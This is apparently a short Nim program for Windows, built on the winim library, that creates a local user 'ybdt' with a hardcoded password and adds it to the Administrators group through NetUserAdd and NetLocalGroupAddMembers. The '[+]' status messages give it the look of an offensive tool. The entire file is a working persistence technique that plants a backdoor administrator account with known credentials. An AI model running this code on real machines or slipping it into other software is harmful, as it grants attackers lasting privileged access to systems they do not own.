import winim

var 
    dwLevel:DWORD = 1
    dwError:DWORD = 0
    UserInfos:USER_INFO_1
    account:LOCALGROUP_MEMBERS_INFO_3


UserInfos.usri1_name = L"ybdt"
UserInfos.usri1_password = L"1qaz@WSX"
UserInfos.usri1_priv = USER_PRIV_USER
UserInfos.usri1_home_dir = NULL
UserInfos.usri1_comment = NULL
UserInfos.usri1_flags = UF_SCRIPT
UserInfos.usri1_script_path = NULL

account.lgrmi3_domainandname = UserInfos.usri1_name

let retVal = NetUserAdd(
    NULL,
    dwLevel ,
    cast [LPBYTE](&UserInfos),
    cast [ptr DWORD](dwError)
    )


if retVal != NERR_Success:
    echo retVal
else:
    echo "[+]User Add Successful !!!"

let fiVal = NetLocalGroupAddMembers(
    NULL,
    L"Administrators", 
    3, 
    cast [LPBYTE](&account), 
    1
    )


if fiVal != NERR_Success:
    echo fiVal
else:
    echo "[+]User Add to Administrator Group Successful !!!"